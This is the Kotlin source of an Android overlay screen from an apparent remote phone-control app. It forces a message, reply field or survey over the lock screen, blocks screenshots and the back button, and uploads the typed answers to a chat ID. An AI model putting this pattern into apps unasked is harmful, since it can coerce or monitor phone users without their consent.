package com.phonecontrol

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.*
import android.graphics.drawable.GradientDrawable
import android.graphics.drawable.LayerDrawable
import android.graphics.drawable.ShapeDrawable
import android.graphics.drawable.shapes.RoundRectShape
import android.os.Build
import android.os.Bundle
import android.text.InputType
import android.util.TypedValue
import android.view.*
import android.view.animation.DecelerateInterpolator
import android.widget.*
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*

/**
 * Универсальный оверлей:
 *  - mode = "plain"   → текст + кнопка ОК
 *  - mode = "reply"   → текст + поле ввода + Отправить
 *  - mode = "survey"  → последовательные вопросы + поле ввода + Далее/Готово
 */
class OverlayActivity : Activity() {

    private lateinit var cardView: LinearLayout
    private lateinit var titleView: TextView
    private lateinit var subtitleView: TextView
    private lateinit var inputLayout: LinearLayout
    private lateinit var inputField: EditText
    private lateinit var actionBtn: Button
    private lateinit var progressView: TextView

    private var mode = "plain"
    private var replyPrompt = "✏️ Напиши ответ:"
    private var questions: List<String> = emptyList()
    private var answers: MutableList<String> = mutableListOf()
    private var currentQuestion = 0
    private var originalText = ""
    private var uploadChatId = ""

    companion object {
        fun start(context: Context, message: String, fbMode: String = "plain",
                  replyPrompt: String = "✏️ Напиши ответ:", survey: List<String> = emptyList(),
                  chatId: String = "") {
            context.startActivity(Intent(context, OverlayActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK
                putExtra("message", message)
                putExtra("fb_mode", fbMode)
                putExtra("reply_prompt", replyPrompt)
                putStringArrayListExtra("survey", ArrayList(survey))
                putExtra("chat_id", chatId)
            })
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true); setTurnScreenOn(true)
        }
        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        )

        buildUI()
        applyIntent(intent)
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        intent?.let { applyIntent(it) }
    }

    private fun applyIntent(i: Intent) {
        originalText  = i.getStringExtra("message") ?: "⚠️ Положи телефон!"
        mode          = i.getStringExtra("fb_mode") ?: "plain"
        replyPrompt   = i.getStringExtra("reply_prompt") ?: "✏️ Напиши ответ:"
        questions     = i.getStringArrayListExtra("survey") ?: emptyList()
        uploadChatId  = i.getStringExtra("chat_id") ?: ""
        answers       = mutableListOf()
        currentQuestion = 0
        applyMode()
    }

    private fun applyMode() {
        titleView.text = originalText

        when (mode) {
            "plain" -> {
                subtitleView.visibility = View.GONE
                inputLayout.visibility  = View.GONE
                progressView.visibility = View.GONE
                actionBtn.text = "ОК"
                actionBtn.setOnClickListener { finishAndRemoveTask() }
            }
            "reply" -> {
                subtitleView.text       = replyPrompt
                subtitleView.visibility = View.VISIBLE
                inputLayout.visibility  = View.VISIBLE
                progressView.visibility = View.GONE
                inputField.hint = "Введи ответ..."
                actionBtn.text  = "Отправить"
                actionBtn.setOnClickListener { submitReply() }
            }
            "survey" -> {
                if (questions.isEmpty()) { finishAndRemoveTask(); return }
                inputLayout.visibility  = View.VISIBLE
                showQuestion(currentQuestion)
            }
        }
    }

    private fun showQuestion(idx: Int) {
        if (idx >= questions.size) {
            submitSurvey()
            return
        }
        subtitleView.text       = questions[idx]
        subtitleView.visibility = View.VISIBLE
        inputField.setText("")
        inputField.hint = "Введи ответ..."

        val isLast = idx == questions.size - 1
        actionBtn.text = if (isLast) "Готово" else "Далее →"
        progressView.text = "${idx + 1} / ${questions.size}"
        progressView.visibility = View.VISIBLE

        actionBtn.setOnClickListener {
            val ans = inputField.text.toString().trim()
            answers.add(ans)
            showQuestion(idx + 1)
        }
    }

    private fun submitReply() {
        val answer = inputField.text.toString().trim()
        CoroutineScope(Dispatchers.IO).launch {
            Uploader.sendText(
                this@OverlayActivity,
                "💬 Ответ: $answer",
                uploadChatId
            )
        }
        showDone("✅ Ответ отправлен!")
    }

    private fun submitSurvey() {
        val sb = StringBuilder("📋 *Ответы на опросник:*\n\n")
        questions.forEachIndexed { i, q ->
            sb.append("*${i + 1}. $q*\n")
            sb.append("${answers.getOrElse(i) { "—" }}\n\n")
        }
        val payload = sb.toString()
        CoroutineScope(Dispatchers.IO).launch {
            Uploader.sendText(this@OverlayActivity, payload, uploadChatId)
        }
        showDone("✅ Ответы отправлены!")
    }

    private fun showDone(msg: String) {
        titleView.text          = msg
        subtitleView.visibility = View.GONE
        inputLayout.visibility  = View.GONE
        progressView.visibility = View.GONE
        actionBtn.text          = "ОК"
        actionBtn.setOnClickListener { finishAndRemoveTask() }
    }

    // ── UI Builder ────────────────────────────────────────────────────────────

    private fun buildUI() {
        // Фон с размытием — тёмный полупрозрачный градиент
        val root = FrameLayout(this).apply {
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(0xCC000000.toInt(), 0xEE0A0A1A.toInt())
            )
        }

        // Карточка по центру
        cardView = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity     = Gravity.CENTER_HORIZONTAL
            background  = cardBackground()
            elevation   = dp(16f)
            setPadding(dp(28), dp(32), dp(28), dp(28))
        }

        // Заголовок
        titleView = TextView(this).apply {
            textSize    = 26f
            setTextColor(Color.WHITE)
            gravity     = Gravity.CENTER
            typeface    = Typeface.DEFAULT_BOLD
            setPadding(0, 0, 0, dp(8))
            letterSpacing = 0.02f
        }

        // Подзаголовок / вопрос
        subtitleView = TextView(this).apply {
            textSize    = 15f
            setTextColor(0xFFCCCCCC.toInt())
            gravity     = Gravity.CENTER
            setPadding(0, 0, 0, dp(16))
            visibility  = View.GONE
        }

        // Прогресс опросника
        progressView = TextView(this).apply {
            textSize    = 13f
            setTextColor(0xFF8888AA.toInt())
            gravity     = Gravity.CENTER
            setPadding(0, 0, 0, dp(8))
            visibility  = View.GONE
        }

        // Поле ввода
        inputLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility  = View.GONE
            setPadding(0, 0, 0, dp(16))
        }
        inputField = EditText(this).apply {
            inputType   = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_FLAG_MULTI_LINE
            minLines    = 2
            maxLines    = 5
            setTextColor(Color.WHITE)
            setHintTextColor(0xFF666688.toInt())
            background  = inputBackground()
            setPadding(dp(14), dp(12), dp(14), dp(12))
            textSize    = 15f
        }
        inputLayout.addView(inputField, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT))

        // Кнопка действия
        actionBtn = Button(this).apply {
            textSize    = 16f
            setTextColor(Color.WHITE)
            background  = buttonBackground()
            setPadding(dp(24), dp(14), dp(24), dp(14))
            isAllCaps   = false
            letterSpacing = 0.04f
            typeface    = Typeface.DEFAULT_BOLD
            stateListAnimator = null
        }

        // Разделитель
        val divider = View(this).apply {
            setBackgroundColor(0x33FFFFFF)
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 1).also {
                it.bottomMargin = dp(20)
            }
        }

        cardView.addView(titleView,    lp(margin = 0))
        cardView.addView(subtitleView, lp(margin = 0))
        cardView.addView(progressView, lp(margin = 0))
        cardView.addView(divider)
        cardView.addView(inputLayout,  lp(margin = 0))
        cardView.addView(actionBtn,    lp(margin = 0))

        val cardParams = FrameLayout.LayoutParams(
            (resources.displayMetrics.widthPixels * 0.88).toInt(),
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).also { it.gravity = Gravity.CENTER }

        root.addView(cardView, cardParams)
        setContentView(root)

        // Анимация появления
        cardView.alpha        = 0f
        cardView.translationY = dp(40).toFloat()
        cardView.animate()
            .alpha(1f).translationY(0f)
            .setDuration(350)
            .setInterpolator(DecelerateInterpolator(2f))
            .start()
    }

    private fun cardBackground(): GradientDrawable {
        return GradientDrawable(
            GradientDrawable.Orientation.TL_BR,
            intArrayOf(0xFF1A1A2E.toInt(), 0xFF16213E.toInt(), 0xFF0F3460.toInt())
        ).apply {
            cornerRadius = dp(20).toFloat()
            setStroke(dp(1), 0x33FFFFFF)
        }
    }

    private fun inputBackground(): GradientDrawable {
        return GradientDrawable().apply {
            setColor(0xFF0D1117.toInt())
            cornerRadius = dp(12).toFloat()
            setStroke(dp(1), 0x446666AA)
        }
    }

    private fun buttonBackground(): GradientDrawable {
        return GradientDrawable(
            GradientDrawable.Orientation.LEFT_RIGHT,
            intArrayOf(0xFF4F46E5.toInt(), 0xFF7C3AED.toInt())
        ).apply {
            cornerRadius = dp(14).toFloat()
        }
    }

    private fun lp(margin: Int = dp(8)): LinearLayout.LayoutParams =
        LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT).also {
            it.bottomMargin = margin
        }

    private fun dp(value: Float): Int =
        TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value, resources.displayMetrics).toInt()
    private fun dp(value: Int) = dp(value.toFloat())

    override fun onStop()        { super.onStop(); finishAndRemoveTask() }
    override fun onBackPressed() { /* заблокировано */ }
}
